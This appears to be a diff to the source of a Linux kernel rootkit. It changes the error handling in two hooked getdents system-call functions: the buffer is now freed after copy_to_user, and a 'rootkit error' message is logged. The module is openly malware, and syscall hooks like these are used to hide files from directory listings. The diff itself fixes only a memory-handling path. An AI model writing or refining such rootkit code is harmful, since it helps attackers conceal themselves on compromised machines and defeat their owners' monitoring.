@@ -109,10 +109,10 @@ asmlinkage int hooked_getdents64(const struct pt_regs * pt_regs)
     err = copy_to_user(dirent, kdirent, (unsigned long) ret);
     if (err)
     {
-        kvfree(kdirent);
-        return ret;
+        printk(KERN_INFO "[-] rootkit error in copy_to_user 1\n");
     }
 
+    kvfree(kdirent);
     return ret;
 }
 
@@ -198,10 +198,10 @@ asmlinkage int hooked_getdents(const struct pt_regs * pt_regs)
     err = copy_to_user(dirent, kdirent, (unsigned long) ret);
     if (err)
     {
-        kvfree(kdirent);
-        return ret;
+        printk(KERN_INFO "[-] rootkit error in copy_to_user 1\n");
     }
 
+    kvfree(kdirent);
     return ret;
 }
 
